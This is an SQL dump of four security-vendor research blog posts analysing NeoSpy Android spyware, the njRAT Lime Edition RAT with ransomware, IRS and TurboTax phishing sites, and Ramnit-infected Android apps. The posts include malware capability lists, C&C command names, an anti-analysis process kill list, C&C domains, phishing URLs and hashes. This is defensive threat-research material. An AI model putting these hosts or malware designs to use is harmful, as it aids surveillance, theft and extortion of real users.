INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (35, 'Spyware presence in enterprise networks', 'Shivang Desai', 'April 05, 2018', 'There are apps for everything, including spying. Users often download such apps for little to no cost and for innocent reasons, such as monitoring their children’s activity on mobile devices. However, what happens when the app is malicious and instead spies on the original user and the environments that user is in? In the BYOD enterprise environment, this can spell trouble for corporate networks.    During the course of daily malicious app tracking activity, the Zscaler ThreatlabZ team came across multiple commercial Android spyware programs. These malicious apps were proactively flagged by Zscaler cloud sandbox as seen below:      	  		  			  		  		  			Fig 1: Zscaler Sandbox  		  	           Technical Details:    Name : NeoSpy  Package : nam.atapp.module  MD5 : 8e7fa22f043ec664cf482b7b7092b3d9    Upon installation, the spyware displays its icon, named NeoSpy Mobile, which, upon clicking, asks the user to register or login.      	  		  			  		  		  			Fig 2: App Installation & Registration  		  	           For a new registration, it asks for login name, login email, and password. These details were being sent to the server in plain text over HTTP, as can be seen in the screenshot below. Anyone sniffing the network can get these details, which opens another attack vector—but that\'s a completely different story.       	  		  			  		  		  			Fig 3: Registration Request  		  	        Once registration is successful, the spyware asks for features to be enabled/disabled on the victim\'s device. Features include:      	Intercepting SMS  	Intercepting calls  	Enabling keylogger (To steal anything typed by victim, especially passwords)   	Stealing GPS coordinates of victim  	Online status of victim  	Stealing photos  	Frequency for sending GPS coordinates (5 minutes/1 hour/never)        	  		  			  		  		  			Fig 4: Enabling spying features  		  	        As soon as basic setup is done, the app icon is immediately hidden from the mobile device. Soon after, the server responds with the location where victim\'s data will be sent. The screenshot below shows the request/response:       	  		  			  		  		  			Fig 5: Server response with destination IP  		  	        As soon as the destination address is received, NeoSpy starts its services and continuously hunts for incoming SMS messages and phone calls, and sends them over to the IP address specified by NeoSpy server. Over the course of the spyware life cycle, the victim remains totally unaware. The screenshot below shows stolen data being sent.      	  		  			  		  		  			Fig 6: Stolen data sent to attacker  		  	        On the other side, the attacker simply needs to log in to the NeoSpy dashboard, which displays the number of devices infected, as shown in the below screenshot:      	  		  			  		  		  			Fig 7: Attacker\'s dashboard  		  	      We ran the spyware in a controlled environment where the virtual Android device was made to receive an SMS message and call. The spyware successfully intercepted the data and relayed it to the server. Both the details along with location of the device are visible on the dashboard, as shown in the above screenshot.     During our analysis, we also found a variant of this spyware available on Google Play Store with installs between 10,000 and 50,000. Zscaler ThreatlabZ contacted Google’s android security team and the app was promptly removed from the Google Play Store. Such spyware uses false/misleading advertising tactics to lure Google Play Store users. SMS spyware programs portray themselves as parental control apps, and location stealers portray themselves as phone tracking devices. In this case, NeoSpy portrayed itself as an anti-theft app with a description as follows:     \"This is an effective phone monitoring module that allows you to find a lost phone or tablet using the geographical coordinates sent to your account. Also you will be able to monitor your child, check where he is, and with whom he communicates, protect him from unwanted acquaintances. All data sent to your personal account is securely protected (AES-128 encryption).\"    The screenshot below shows this spyware app on Google Play Store before it was removed:      	  		  			  		  		  			  			Fig 8: NeoSpy on Google Play Store  			  		  	        Conclusion:    The use of Android spyware apps has become fairly common, but with corporate BYOD (Bring-Your-Own-Device) policies, their use can become devastating as employees bring devices loaded with the spyware and connect them to the company\'s network. It\'s possible that an infected device on a corporate network could leak sensitive information to an attacker. Or, imagine the presence of a spyware app on a government and defense personnel’s mobile device that could then leak not only private call details, but also locations and photos that may contain highly sensitive information.     In most cases, an attacker needs physical access to the device to set up such spyware properly. It is therefore advisable to deploy password-protected measures like pattern lock or pin lock on mobile devices.     While further examining the Zscaler cloud, we found an increased presence of spyware in enterprise networks over the past two months (see details in Appendix A). Zscaler identified this threat as Android.Gen.Spyware.    Appendix A      	  		  			     App Name  			                              MD5  			      Spyware Variant  		  		  			MobileTracker App  			53ec451d2746f35ea2183fed71b792d4  			Mobile-Tracker-Free (MTF)  		  		  			brasil.apk  			639d2383c4267884a390d8d2f2463a0d  			iSpyoo  		  		  			neospy.apk  			8e7fa22f043ec664cf482b7b7092b3d9  			NeoSpy  		  		  			MobileTracker App  			875ea463d7f40709f53b5eb9fbdb231f  			Mobile-Tracker-Free (MTF)  		  		  			MobileTracker App  			fbd72f310c9efcdf48e7d69c02ac0219  			Mobile-Tracker-Free (MTF)  		  		  			TheTruthSpy.apk  			2f149f3890ac1fb31afbcf8b5c2a917e  			TruthSpy  		  		  			TheTruthSpy.apk  			b208d4203b7b3675106aff62f840b81b  			TruthSpy  		  		  			TheTruthSpy.apk  			6b954360ef997a3d551f4437bc1aeb72  			TruthSpy  		  		  			MobileTracker App  			efb56ceea844ddffc97b3c5ba973f39f  			Mobile-Tracker-Free (MTF)  		  		  			TheTruthSpy.apk  			4ec7b793f0664e4321e2369ccc077e17  			TruthSpy  		  		  			TheTruthSpy.apk  			11878010fd3bffeb64bd8f0a80648d95  			TruthSpy  		  		  			MobileTracker App  			19fd7f77c8431df87593ce9468a90c7e  			Mobile-Tracker-Free (MTF)  		  		  			TheTruthSpy.apk  			c349e6446b22f7daa137a45605cee25e  			TruthSpy', 'Malware', 'https://www.zscaler.com/blogs/research/spyware-presence-enterprise-networks');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (36, 'njRAT pushes Lime ransomware and Bitcoin wallet stealer', 'Tarun Dewan,', 'March 30, 2018', 'Updated - April 1, 2018    Updated - April 3, 2018 (added IOCs)    njRAT, also known as Bladabindi, is a remote access Trojan (RAT) that was first seen in 2013 and continues to be one of the most prevalent malware family. It was developed using the Microsoft .NET framework and, like many other RATs, provides complete control of the infected system and delivers an array of features to the remote attacker. There are multiple .NET obfuscation tools that make detection difficult for antivirus solutions and that hinder analysis by security researchers. njRAT utilizes dynamic DNS for command-and-control (C2) servers and communicates using a custom TCP protocol over a configurable port.    We covered njRAT builder kit in our previous blog published in 2015. In this blog, we will cover one of the newer variant of njRAT dubbed njRAT Lime Edition that we are seeing in the wild. This variant includes support for:      	Ransomware infection  	Bitcoin grabber  	Keylogger  	USB spreader  	Password stealer  	Bot killer  	Screen Locker  	DDoS (ARME,Slowloris)      Below is a snapshot of the njRAT Lime Edition configuration file:        Some highlights from the configuration files:      	  	Configured to drop into Temp folder of the infected system with filename Client.exe  	  	  	Bot Version: 0.7.3  	  	  	C&C server: online2018.duckdns[.]org  	  	  	Port Number: 1700  	      Upon receiving searchwallet command, the malware tries to gather the running process in the victim\'s machine and uses it to track crypto wallets when merchants buy or sell Bitcoins or make other payments. These digital wallets securely store digital currency, and they can be connected to bank accounts, debit cards, or credit cards, so that digital currency can be exchanged into and out of one\'s local currency.      	Bitcoin core aka bitcoin-qt  	Bitcoin.com  	Electrum          The malware leverages windows WMI queries, such as \"SELECT * FROM AntivirusProduct\" and \"SELECT * FROM Win32_VideoController,\" to check for VM or sandbox environment. It is capable of sending system information such as:      	System Name  	UserName  	Windows Version  	Bits(64 or 32 bit)  	WebCam(Yes/No)  	Active Window  	CPU  	Video Card  	Memory  	Volume Information  	Installed Antivirus  	Infection time      Malware monitors for the following process names on the victim machine and if found in running state, malware will try to kill the process:      	Process Hacker  	Process Explorer  	SbieCtrl  	SpyTheSpy  	SpeedGear  	Wireshark  	Mbam  	apateDNS  	IPBlocker  	Cports  	KeyScrambler  	TiGeR-Firewall  	Tcpview  	Xn5x  	smsniff  	exeinfoPE  	Regshot  	RogueKiller  	NetSnifferCs  	taskmgr  	VGAuthService  	VBoxService  	Reflector  	Capsa  	NetworkMiner  	AdvancedProcessController  	ProcessLassoLauncher  	ProcessLasso  	SystemExplorer  	ApateDNS  	Malwarebytes Anti-Malware  	TCPEye  	SmartSniff  	Active Ports  	ProcessEye  	MKN TaskExplorer  	Currports  	System Explorer  	DiamondCS Port Explorer  	Virustotal  	Metascan Online  	Speed Gear  	The Wireshark Network Analyzer  	Sandboxie Control  	.NetReflector      This njRAT variant also has the capability of performing ARME and Slowloris DDoS attacks. Slowloris is an attack tool designed to allow a single machine to take down a server with minimal bandwidth, and also to send multiple partial HTTP requests. Slowloris tries to keep many connections to the target web server open and hold them open as long as possible. ARME attack also tries to exhaust the server memory.                 The malware shuts down and restarts the system with the following command:        Switches:    -r -> restart the computer that\'s currently being used    -t -> time, in seconds    -f -> forces running programs to close without warning    We have seen the following C&C commands in the malware:      	C&C Commands  	  		  			delchrm  			Delete chrome cookies and saved logins  		  		  			MonitorOFF  			Turn off monitor  		  		  			TextToSpeech  			Announces text received from C&C using TextToSpeech  		  		  			NormalMouse  			Restores normal mouse button functionality  		  		  			taskmgrON  			Enable task manager  		  		  			ChngWLL  			Change wallpaper  		  		  			Kl  			Keylogger command that checks foreground window and keys pressed  		  		  			Seed  			Sharing, downloading files with torrent software such as BitTorrent and uTorrent  		  		  			ddos.slowloris.start  			Start Slowloris attack  		  		  			RwareSU  			Drop and show ransom note  		  		  			restartme  			Restart the computer  		  		  			DisableCMD  			Disable command prompt  		  		  			EventLogs  			Delete event logs  		  		  			BitcoinOFF  			Stop Bitcoin monitor thread  		  		  			Botk  			Start the botkiller thread  		  		  			pcspecs  			Send system information (CPU/GPU/RAM)  		  		  			Searchwallet  			Check installed bitcoin wallets in the system and send to C&C server  		  		  			PLG  			Load plugin and configure with C&C server  		  	      The malware also has a WORM functionality to spread through USB that enumerates the files and folders on the hard drive. Once it detects the USB drive inserted into the system, it copies itself to the USB drive and creates a shortcut using the folder icon.        Ransomware functionality    The ransomware encrypts files with the extension .lime using the AES-256 symmetric algorithm, which means the key is the same for encryption and decryption.    Ransomware Key generation    When Lime is first launched, it will call a RandomString() function, which will attempt to generate an AES key. It generates a 50-byte array from the input string using a random index, and uses the random() function to fetch one character and stores it to the output string. Lime drops the output string at %AppData%\\\\Microsoft\\\\MMC\\\\hash location.        Upon receiving command, the malware will try to encrypt files in following folders:      	Environment.SpecialFolder.LocalApplicationData  	Environment.SpecialFolder.ApplicationData  	Environment.SpecialFolder.ProgramFiles  	Environment.SpecialFolder.Desktop  	Environment.SpecialFolder.Favorites  	Environment.SpecialFolder.Personal  	Environment.SpecialFolder.MyMusic  	Environment.SpecialFolder.MyPictures  	Environment.SpecialFolder.Recent      The malware also contains function to decrypt all files that are encrypted by Lime ransomware as seen below:        Zscaler ThreatLabZ is actively tracking njRAT variant activities and ensuring Zscaler customers are protected.    Indicators of Compromise    MD5  dee4b5a99bcd721c3a88ae3180e81cc1  35bd9b51781dfb64fd5396790265ab10  c7dc42db2f7e5e4727c6f61f9eed0758  01b791955f1634d8980e9f6b90f2d4c0    C&C  online2018.duckdns.org  oficinabogota.duckdns.org      Zscaler Detection Names  Win32_Backdoor_NjRATLime_117974  Win32_Backdoor_NjRATLime_117975  Njrat_2227 (generic)', 'Malware', 'https://www.zscaler.com/blogs/research/njrat-pushes-lime-ransomware-and-crypto-wallet-grabbers');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (37, '2018 Tax Season Phishing Scams', 'Rohit Hegde', 'March 15, 2018', 'Cybercriminals have long used social engineering and phishing techniques to lure unsuspecting users into giving away private information. They track current trends and events to make their attacks more effective, and tax season offers a rich opportunity for attackers to disguise themselves as well-known brands and even government agencies in an effort to exploit users. The Zscaler threat research group has examined the traffic in the Zscaler cloud for the past 2 months and has noticed new phishing websites that attackers are hosting this tax season, and we will share our observations about how they’re targeting their victims and tricking them into divulging personal and financial information.    Tax phishing campaign #1 – IRS phishing over HTTP/HTTPS    Below is a phishing page that is spoofing the IRS in an attempt to collect users’ IRS login credentials.                          Figure 1: IRS Phishing Login page.    The same server was also hosting a fake IRS account unlock webpage as shown below.                          Figure 2: IRS Phishing account unlock page.    In this scenario, the attacker tries to make the user redirect to an e-policy statement hosted on the actual IRS page seen here.    With this page, the attacker is attempting to prevent user suspicion by redirecting the user from this phishing page to a legitimate e-policy statement hosted on the actual IRS page and shown here.                          Figure 3: Original IRS e-policy page to which user is redirected after phishing activity.    At this point, the victims believe they have completed the account unlock process and they proceed to log in on the legitimate page unaware that their information has been stolen.    This activity was observed on a compromised website: valeortho[.]com. From Fig. 1 and Fig. 2, we can see that the phishing website was on HTTP. However, we also saw the same activity over HTTPS.    Tax phishing campaign #2 – “chalbhai” IRS phishing    Another example of an IRS identity validation phishing site can be seen here.                          Figure 4: IRS identity validation phishing.    We see that the phishing page is based on an old template, since the page refers to 2014 Federal Income Tax year. The interesting point to observe is that when we check the source code for this phishing page, we see a term “chalbhai” in the form. We have typically seen this tag associated with phishing pages that look like Microsoft Office 365, Apple ID, Dropbox or DocuSign. This is a good example of criminals adapting their phishing content to reflect current trends. The tag can be seen in the screenshot below.                          Figure 5: “chalbhai” campaign.    The hits for the “chalbhai” phishing campaign for the months of Jan. and Feb. 2018 are shown below.                          Figure 6: “chalbhai” campaign hits for months of Jan and Feb 2018.    Tax phishing campaign #3 - encrypted IRS phishing    Attackers also try to evade detection from network security engines by encrypting webpage content. In this case, the attacker has used the AES algorithm to encrypt the page. Once the page is downloaded on a victim’s machine, the JavaScript on the page will use the AES decrypt function to decrypt the content and display the phishing page in the victim\'s browser. The IRS phishing page that is displayed to the user is shown here.                          Figure 7: IRS identity verification phishing page.    The figure below shows the call to the AES decrypt function on the phishing page,                          Figure 8: AES decrypt call on phishing page.    More examples of phishing URLs employing encrypted content:    irs.gov.com.alfaisalenterprise[.]com/IRS.GOV/IRS.GOV/directpay/indentify.php?ip=    irs.gov.mdnmsv.voltwisecontrols[.]co.ke    irs.gov.dnmsv.vapeshop[.]co.ke    irs.gov.mdnmsv.voltwisecontrols[.]co.ke/caseid0211/wait.php    We have also seen encrypted phishing templates being leveraged to target brands like Apple, Chase, HSBC, and Paypal in past few months.                          Figure 9: AES encrypted phishing campaign hits for months of Jan. and Feb. 2018    Tax phishing campaign #4 -  Intuit TurboTax phishing    Attackers are also targeting known tax preparation tools like TurboTax. Here is one such example.                          Figure 10: turbotax phishing page.    In this instance, once the user enters the information and clicks update, the user is redirected to the actual TurboTax login page shown below. Similar to the IRS example, the attacker steals the information before redirecting to a legitimate page, keeping users unaware that they have fallen victim to a phishing attack.                          Figure 11: Original turbotax login redirect after phishing page submit.    Another variant of the TurboTax phishing page is shown here.                        Figure 12: TurboTax phishing page variant.    Conclusion    We have seen various types of phishing campaigns take advantage of tax season and leverage tax-related themes. The attackers use various methods to deliver the phishing content, ranging from AES-encrypted content served over HTTP, plain templates over HTTP/HTTPS, fake tax products, spoofing well-known brands, and so on. In the phishing campaigns that we analyzed for this report, we noticed that the attackers are leveraging two important entities involved in the tax filing chain for most consumers: popular tax filing software (in this case, TurboTax) and the tax governing agency IRS.    With high stakes during tax season, users should take extra care to ensure the sites they are using are legitimate. Don’t just look at what’s in the window; look at the URL address. All sites should use HTTPS. The domain name should match the name of the site you are visiting, as seen here:                Additionally, users can reference the IRS Tax Scams/Consumer Alerts page as well as this article on phishing attacks, “Phishing Schemes Make IRS ‘Dirty Dozen’ List of Tax Scams for 2018; Individuals, Businesses, Tax Pros Urged to Remain Vigilant.”      Zscaler ThreatlabZ is actively monitoring these tax related phishing campaigns and ensuring that Zscaler customers are protected.', 'Phishing', 'https://www.zscaler.com/blogs/research/2018-tax-season-phishing-scams');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (38, 'Android apps infected with Windows malware reemerge', 'Gaurav Shinde', 'March 06, 2018', 'Introduction     During our regular course of tracking malicious Android apps in the wild, we came across an app available on the Google Play store that was infected with a malicious iFrame. Upon further analysis, we found hundreds of such apps on Google Play with the same infection.    This is not a new threat. Similar infected apps have been found by other researchers, in which the app author’s development platform was probably infected with this malware that injects the malicious iFrame on all HTML files found on the system. It is surprising to see that the trend of APKs infected with Windows malware has continued for almost a year.    There is no impact on the end mobile users who download these apps, as the malware does not target the Android platform, and the domains involved had already been sinkholed. However, the discovery of the malware highlights the fact that propagation of infections across different platforms is quite possible. This vector can be leveraged by a clever attacker to serve second-level malicious payloads depending on the type of device platform visiting the URL.      	  		  			  		  		  			                                Fig. 1: Apps on Google Play from the developer technodroid  		  	           Infected HTML in APK – Ramnit    Infected Android Package Kit (APK) files contain HTML files infected by the Ramnit worm. This worm spreads by infecting all available EXE, DLL, HTML, and HTM files on the compromised Windows system. If the developer’s system is infected with this worm, it will inject a malicious iFrame in the HTM/HTML files in the source code of Android projects that eventually end up in the APK. Since the URL used in the injected iFrame is sinkholed by the Polish CERT, this infection won’t cause any harm to Android devices.           	  		  			  		  		  			                                                 Fig. 2: IFrame injected at the end of HTML  		  	           We found around 150 infected apps that belonged to different developers. Almost all of these APK files are being flagged for the Windows malware infection by various host AV scanners.           	  		  			  		  		  			                                                                        Fig. 3: VirusTotal scan result for a sample APK  		  	           Conclusion    We have reached out to the Google Android security team and shared our analysis. While this malware currently doesn’t cause harm to end users, it is clear that such infections can otherwise act as an open door for other attacks. Google has a category defined to flag such potentially harmful applications known as non-Android threats. Google’s definition of this category is: “An application that contains non-Android threats. These apps are unable to cause harm to the user or Android device, but contain components that are potentially harmful to other platforms.”      IOCs      	  		  			                             MD5  			                        Package Name  		  		  			259c29cdfb91f48a5321e89d9d2d6f1d  			98768a47b3e351063734b972bd5c67ca  			9c34ec4afcd0cc66dcfa46aae3973be5  			02dd6ad1e08d6f8b819c84c68028d999  			9bcb8d8c33ec5184acc2c2d0eae8ba1a  			3bdbaa13093b96a79cbeaf5d43ad12fb  			9d8e7a35e5a14eacec479632c9a7130c  			c71b4be2f09868beea4c3f1a3f704824  			08016628ac341ab36c62ced4ae8e65b9  			ee89f651e3f27bdccd09e0952b1983cb  			3ef8941a1a5f03dea5b043e374ee5327  			902dd31f98d1192fc679dc9dfd2e1803  			bffbd443a300ef6fcde98c9b20907561  			78b15a004327156d294a0ccb941970d8  			b9d516ef6c5d8e27bc3bcd6c3bde14e6  			651429a404a0b5d05b6b33227e06684d  			a1bd9d590a42b0369d70af9a6adb4403  			a41a6fe374f1f5f36f094789c9080308  			a718ff0692fc82a37e3e3d2e6d568940  			36659e04830a10069de31bcac3840de9  			ec37ac654b8b3b3db435742249d7d2eb  			289afe7d30867b1e0e2c2dbb8dc4321e  			c643f4c580450c6645106d23269050ed  			f7900f34e26d4e9861ba98fd8dd3e7ce  			137131e4eb5c8cb4fec10fec1522b14a  			6859c5223356480257c33e37f1c551a9  			4217790aae0fe5299c60296e8a30da6b  			3048d2ba91ec0ced4c25e05e751043b1  			ac4f76a3de5821713274cadaf4fee5d5  			f8d7952c58ff4f62a3ad0722e2c831d0  			055228eb6aad38402ca3be5546b1d9bf  			187c2070770e5c445dba31c37cb53105  			f4be20f1ff68994ee579639aec8aeaf2  			ed4d70a33517d032399fe79f6bbc9a88  			cba3c299ef9e4d0777b52878a1381b10  			ee33dcd4403982015e7099e16faa7e8f  			ba92f75f28b05eebd937e9ed8980b197  			6066d9a01d9199dd02a6da40bd1a8309  			b9c6e6e9ccdb03d2c49371b6632a9172  			fb47c49f6596aa36d6e783721e870742  			bebc3c00377fb6321c29a7dcd39c3f23  			3044904a3529006fe39a6e688f0c9ca1  			37efa7f85d4bcd6125f1ada97c5d811d  			4bbbc7c9a8d4e179e85ac3fc5d15fe5a  			936e5a83276b098285d9a67ce67be14d  			4959f454520af56e22b2d35ea19e3d2f  			ca9186a3f62328a2fa329ebf921f9019  			aa4534786ab34e2ea3d8e94e401dbf81  			5a60b6e02a5fe286bd0c1c6a2ebcfa35  			b7fb9523b08421a52c2e2e7078b38377  			21b1c909b665f18ec18aa4912a7a3cd8  			e98a849c84b1774d11ef244c9cf16342  			8caece138f21a83178d76d18a7698fbc  			1821b5a991df3ae195d9cc4dd03e12f8  			863398ac2b818e73c5e30fffde9a61be  			8b9ac75c7543eed441f51d0026e8e267  			1ed909694c6a2417597dc9115afde8a4  			c1ee98522b3cd4d64cbcd1cfdeb3de10  			dde3c4a7c70c2d85fad3e7a40b5f198b  			182a5c4a19c0a18344c083cfc43341eb  			f44fd2915fd8e026ab07931d4e265364  			a1ec080f32775dd8305b2f3bdbc0015b  			7a25d22bb7c2501fecb2b9889eff2ffc  			0ed956b4795fa862fb13fb0b4423f7b3  			57c797936f4ed452e2baacd45ee92aa4  			a56041d1b5f32ca392cbb3ff5e0c7519  			189edf5ab8e71f06415fb9d5c323e0d4  			0f10940ae7852b4ca43cf869013420c6  			0433d86ec4cbc7f9afa26be1970d1371  			00141ea42b8a289bd2244c693e477001  			bd249c67a1d38fc52ea76baec13227e1  			475b3e022cf4d18f1ab24cb8b244ec5d  			ca2d3047ee7533c9798ea447a2decbf0  			aac03b545cfd55ccee45cdbf94f71680  			4c6e8a40857ab42cc28e26f451c69511  			323ae1f14f019dcfb13d01e76215b3b9  			333b6796012fa13a80d3641b893c5713  			3bc8ca9d90c57a2e924d053c37311e6b  			c639d43bd6a2e000435e98a3d53c9a4f  			e3c3369df3046c624daad6b56e7ad13c  			d143986d1c3906f8acebbbd3c5dc478a  			84a4fd73d6fd48be684f22367ae95504  			1ed2aa0fdffb042358491ade73672fe9  			0a3be4e53a2b74b9cc4483c765f824e1  			973211d7e585376d8a620298c8e53a39  			1bd5346bb9f50f3e94d7952e6515325b  			0677f2c0c6d4cf1635cea73b6b15c42b  			f2a039e7e9dbe023b22186bcd4520a09  			1490ae4d2ad15ac4333ce71367b68df5  			795cae0cdb90c9fd4d4c4b6840b382d4  			230dc5574e7f9e98aac0f7ac5314882b  			9f1d3bdcba08e6021e129416d1b66fcd  			e94965d66198d2f5fd6a014ba2cb313e  			bc327bb49f4fc94c4e68a08b927748c5  			87cdda94c67dcc88f95af96e0e8259a4  			0d549a7a4c1eda48e6a07ca90139dde6  			2bddaee2d2421148c9bc8832853a3db4  			9a12f53cd946ce476029ea03e5376bba  			d01d32db50fb2a9593a11fcff734c6fb  			1ea7dc242f4248ef2048d5a9978acd0a  			3fd28067725154b87f219283d888e22d  			2dcace2f8316dd212f1136dfb83bacb4  			c30aba7ca150d69b858cd0b3100a1468  			24313f1cd4082a89112af29b551e5f86  			3de2dc4422b7530e9e7bd7f1d09de111  			f15d926c4aba53f800fd1e99c233f200  			dbb67fab5512663daab109f61715dcc7  			099ed0a8ca86f2a6d89a30ac173e20a6  			e854da9c82efecb801ac5b4291a9e086  			67e356a3d6af8e1aab57cf4f14d8aebf  			aa7883c1f22e10fb7dd49c554f7896b9  			066a09af0aece59471faf7c20f3c8ce3  			6fb66f6d03b864f6fd22ca727beb8ca5  			73fa9331d4f92f6271f83ebdfc4b6ed4  			8f5e026b5ef76a4a129245a0a9472dfe  			b6077926e40f714a9c5ec1a25df97dcf  			e6ef24f6e2222c8f3408cd63496cbf19  			3b018c9049a92ae64e53915cf1737533  			5d486d4715463c19d97c13eab3ccb76d  			55ea4813783f7abf08faa3b59635230b  			88f3e8713fb6cd8e733f654b294e370b  			60dd5d915a0fd57e48e3ac396512c0f0  			7df2e52bcdd52f6b24ead491398bb72a  			1b01a2f0092739e163fbfc2ef2060991  			a50d07acbc70414c7ffebb68f58d10f3  			83aa5b1e5bb44c28f881f80aa083bb82  			cc403b1d9bb64e43a53c9e5551e33d0d  			6cf121d3d51bab4e7182e12f79946240  			f512d625d286be09547b0b176624a71c  			4b6ed52b8e3a8a04ccea85a5b1e253f6  			43c01438a30fb361116efcfc4277db30  			5a4240b13bb6328dcec3eb09253ef213  			13bcbbf7f1c309d949d8bd59edfb42d7  			a6b16bf0d4b2b5e8411701e0b4d81813  			317f2b23c7446a11f8bbf34c9d7191f4  			fe8b46e7a51da1e17c182a5490bdb3a6  			0051b580d56a213ffb5c1dce9e043a98  			1a34bb850d8165063eb83fd69b458277  			30754111ce0a4fa5707952f48dc3cf25  			46577b6dfe593f0676030c4876981cc1  			43e08989493b8931fca8250524581f0e  			83f87730a1928ecd7e628c577ebd1de4  			c12c4734816c9b2e1b3020f46af996c5  			1cd39e43571bbe09b0d435a3e2117408  			113a7016c38f5eee2d72b91ee45e0d82  			d22a502963b8c65b7e1def97acd458af  			a30d563d2db9cb40237a2ef86f7c9d1d  			5430933e307ef9ee8079781d14c803ac  			b0e32bff980d59cf2ae631c987546240  			988d894eeaefda115ff28f5334d08ba7  			8d128fc77392d4c236320c2351c045bc  			   			com.BelaDiriBest.technodroid  			com.bleachs.technodroid  			com.NaGa.technodroid  			com.SuperHeRo.technodroid  			com.RuangKantor.kangsueb  			com.AdventureTiMe.technodroid  			com.animepopular.technodroid  			com.Uchicha.technodroid  			com.acdemiyaa.technodroid  			com.LayangLayang.kangsueb  			com.PencilSuparman.technodroid  			com.TeKnikAikiDo.technodroid  			com.angrybirds.technodroid  			com.MoRtaLKomBat.technodroid  			com.gauncasual.kangsueb  			com.tkypghouul.technodroid  			com.DrawingAlien.technodroid  			com.DisNeyPinCeS.technodroid  			com.NasiTumpeng.kangsueb  			com.PoweRGiRlS.technodroid  			com.TaichIBest.technodroid  			com.boiboiboyi.technodroid  			com.dindingtamu.kangsueb  			com.kyuubii.technodroid  			com.DespiCabalMe.technodroid  			com.sandalcrochet.kangsueb  			com.pelatihanbiinaragaa.kangsueb  			com.homeemiiniicraft.kangsueb  			com.Miiniicraeft.technodroid  			com.LantaiDimensi.kangsueb  			com.jerryyi.technodroid  			com.TaRZaN.technodroid  			com.MuaiyThaii.kangsueb  			com.spongebob.technodroid  			com.mewarnaiipemandaangaan.kangsueb  			com.DigiMonN.technodroid  			com.SaiYanGoku.technodroid  			com.taeekwoondoo.kangsueb  			com.sepatupriia.kangsueb  			com.koombiinasii.kangsueb  			com.mejarapat.kangsueb  			com.sketsaatattoo.kangsueb  			com.aniimegadiis.kangsueb  			com.ultraamaan.technodroid  			com.BOXING.technodroid  			com.PintuGeser.kangsueb  			com.Gulat.AlengkaApp  			com.oneepiecee.technodroid  			com.CatNoiR.technodroid  			com.dragoneballs.technodroid  			com.dindingbatu.kangsueb  			com.GymnasticsClothingDesignNew.ceceapk  			com.BasicGymnasticMovements.ceceapk  			com.GambarAnk.kangsueb  			com.sedotan.kangsueb  			com.wedding.ajo  			com.laeernchii.kangsueb  			com.naruutoo.technodroid  			com.ClsheNClasN.technodroid  			com.tenagaadalaam.kangsueb  			com.PencilBatman.technodroid  			com.BaTMaN.technodroid  			com.Pennywise.technodrid  			com.DrawMiniicrafte.technodroid  			com.IronMan.technodroid  			com.MotorDrag.kangsueb  			com.perencanaanHomee.kangsueb  			com.classic.ajo  			com.bollavollii.kangsueb  			com.kancingbaju.kangsueb  			com.PopularHairstylesCoolMen.ceceapk  			com.wedding.inv  			com.peemandaangaan.kangsueb  			com.MaiiThaii.technodroid  			com.gayarambut.kangsueb  			com.casualhijab.kangsueb  			com.SooniicC.technodroid  			com.HoomeJeepang.kangsueb  			com.room.ajo  			com.DrawingDrago.technodroid  			com.KarakterDBZ.technodroid  			com.gerakansenam.kangsueb  			com.PaintZomBie.technodroid  			com.tekniikaiikido.kangsueb  			com.ChibiFlasH.technodroid  			com.TutFitneS.technodroid  			com.MINIoN.technodroid  			com.membentuukotoott.kangsueb  			com.SMI.daf  			com.perangkapiikaan.kangsueb  			com.Frankenweenie.technodroid  			com.pelatihaann.kangsueb  			com.seniibelaadiirii.kangsueb  			com.ToyStory.technodroid  			com.DrawCoc.technodroid  			com.coonaan.technodroid  			com.boroto.technodroid  			com.kotakhadiah.kangsueb  			com.JinBanYaN.technodroid  			com.wingchuun.technodroid  			com.claasshee.technodroid  			com.BatmanVsSuperMan.technodroid  			com.sketsaakaartuun.kangsueb  			com.RoboT.technodroid  			com.dindingkertas.kangsueb  			com.BenTeN.technodroid  			com.inuyashaa.technodroid  			com.rumahunik.kangsueb  			com.UkiranEs.kangsueb  			com.KerajinanBunga.kangsueb  			com.hiasadinding.kangsueb  			com.prawedding.kangsueb  			com.SpiderMaN.technodroid  			com.beladiriishaolien.kangseub  			com.StarWaRs.technodroid  			com.pelatiihanfitneess.kangsueb  			com.AvatarR.technodroid  			com.SheunTheSheep.technodroid  			com.ManGaCanTiK.technodroid  			com.taliipanciing.kangsueb  			com.GerakanGyM.kangsueb  			com.jOkerR.technodroid  			com.kerajinankulit.kangsueb  			com.KerajinanOrigami.kangsueb  			com.supersaiiyaa.kangsueb  			com.fnaaff.technodroid  			com.MadaGascar.technodroid  			com.HomeMiniCrafte.technodroid  			com.teekniikkeendoo.kangsueb  			com.TrikKaraTe.technodroid  			com.seenaamlanataii.kangsueb  			com.pakaiandaLaM.kangsueb  			com.TaekWonDo.technodroid  			com.GrafitiDimenSi.kangsueb  			com.MaRio.technodroid  			com.beladiriikungfuu.kangsueb  			com.BeladiriPanduaN.kangsueb  			com.TanahLiat.kangsueb  			com.skeetsageduung.kangsueb  			com.peencaaksiilaat.kangsueb  			com.SofaMinimalis.kangsueb  			com.PPI.daf  			com.oriigamiipedangg.kangsueb  			com.latihaangyim.kangsueb  			com.rackfurniituree.kangsueb  			com.DrawingKhrisna.technodroid  			com.IroonMaN.technodroid  			com.BestHaircutForBabyBoyIdeas.ceceapk  			com.belwiingchuun.kangsueb  			com.OahragaaRumaah.kangsueb  			com.cinderamata.kangsueb', 'Malware;Mobile', 'https://www.zscaler.com/blogs/research/android-apps-infected-windows-malware-reemerge');
